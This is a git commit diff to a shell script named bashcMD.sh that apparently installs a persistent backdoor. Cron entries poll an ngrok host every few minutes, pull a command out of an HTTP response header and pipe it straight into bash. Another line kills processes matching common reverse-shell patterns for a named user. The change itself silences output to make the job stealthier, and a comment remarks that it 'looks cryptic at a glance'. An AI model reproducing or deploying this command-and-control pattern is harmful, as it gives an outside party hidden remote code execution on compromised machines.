a33b3b84dbbb79b0ea299da951f692003f193f3a
MOZZES650 <110117895+MOZZES650@users.noreply.github.com>
2026-04-05 04:48:20 +0200

    Update bashcMD.sh

--- bashcMD.sh
+++ bashcMD.sh
@@ -8,7 +8,7 @@ pkill -u mangalamuhurtha -f "acpid.socket|sh -i|cat /tmp/f|/bin/sh -c curl|scrip
 # CRON job
 # Looks cryptic at a glance
 */1 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/alam | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
-*/5 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/alam | grep -i '^lee:' | cut -d':' -f2- | xargs | script -q -c "/bin/bash" /dev/null
+*/5 * * * * curl -sI https://desired-gazelle-steadily.ngrok-free.app/alam | grep -i '^lee:' | cut -d':' -f2- | xargs | script -q -c "/bin/bash" /dev/null > /dev/null 2>&1
 
 
 # RIG
